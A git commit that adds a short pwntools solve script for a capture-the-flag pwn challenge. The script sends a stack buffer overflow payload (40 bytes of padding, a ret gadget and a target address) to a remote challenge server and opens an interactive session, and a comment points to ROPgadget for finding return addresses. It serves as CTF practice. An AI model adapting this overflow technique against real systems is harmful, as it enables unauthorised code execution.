334c6a659fbd742dc8ad6a1323eec1722336ec9d
fahim al shihab <97816146+fahimalshihab@users.noreply.github.com>
2024-08-27 14:19:14 +0600

    Add files via upload

---
+++ CygenixCTF pwn classic/sol.py
@@ -0,0 +1,9 @@
+from pwn import *
+
+#p = process('./main')
+p = remote('chall.ycfteam.in','3333')
+p.sendline(b'a'*40 +p64(0x0000000000401016)+ p64(0x0000000000401156))
+
+p.interactive()
+
+# for 65 bits we need a retrurn adress  "ROPgadget --binary ./file" will five us one
